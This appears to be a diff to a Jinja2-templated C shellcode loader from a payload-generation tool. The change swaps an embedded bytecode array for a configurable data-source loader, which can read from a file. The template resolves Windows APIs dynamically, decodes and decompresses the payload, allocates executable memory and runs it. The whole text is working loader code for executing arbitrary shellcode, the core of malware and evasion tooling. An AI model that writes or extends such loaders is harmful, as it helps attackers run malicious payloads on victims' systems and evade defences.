@@ -22,11 +22,8 @@ char debug_buffer[512];
 #define DEBUG_PRINT(fmt, ...) // The macro becomes nothing if debug is off
 {% endif %}
 
-// --- Transformed Bytecode Placeholder ---
-unsigned char transformed_bytecode[] = { {{ bytecode_array }} };
-unsigned int transformed_bytecode_len = sizeof(transformed_bytecode);
-
 // --- DYNAMICALLY INCLUDE PARTIALS ---
+{% include data_source_partial %}
 {% include 'partials/api_resolver.c.j2' %}
 {% include allocation_partial %}
 {% include execution_partial %}
@@ -41,22 +38,32 @@ unsigned int transformed_bytecode_len = sizeof(transformed_bytecode);
 
 
 // --- Function Forward Declarations ---
+BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize);
 void* AllocateExecutableMemory(SIZE_T size);
 void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len);
 void ResolveAPIs();
 
 // --- Main Logic ---
 void Run() {
-    unsigned char* current_data = transformed_bytecode;
-    size_t current_len = transformed_bytecode_len;
+    unsigned char* initial_data = NULL;
+    DWORD initial_len = 0;
+    unsigned char* current_data = NULL;
+    size_t current_len = 0;
     unsigned char* decoded_data = NULL;
     size_t decoded_len = 0;
     unsigned char* decompressed_data = NULL;
     size_t decompressed_len = 0;
     void* exec_memory_block = NULL;
-    
+
     ResolveAPIs();
 
+    if (!LoadData(&initial_data, &initial_len)) {
+        DEBUG_PRINT("Run: Failed to load initial data");
+        return;
+    }
+
+    current_data = initial_data;
+    current_len = initial_len;
     
     {% if bytecode_transformation == 'base64_encoder' %}
         decoded_len = (current_len / 4) * 3 + 4;
@@ -92,6 +99,12 @@ void Run() {
     ExecutePayload(exec_memory_block, current_data, current_len);
 
     // Cleanup goes here
+    if (initial_data != NULL) {
+        {% if data_source == 'file' %}
+        pfnHeapFree(pfnGetProcessHeap(), 0, initial_data);
+        DEBUG_PRINT("Run: Freed memory from data loader.");
+        {% endif %}
+    }
     if (decoded_data != NULL) {
         pfnHeapFree(pfnGetProcessHeap(), 0, decoded_data);
         DEBUG_PRINT("Run: Freed memory from decoding buffer.");
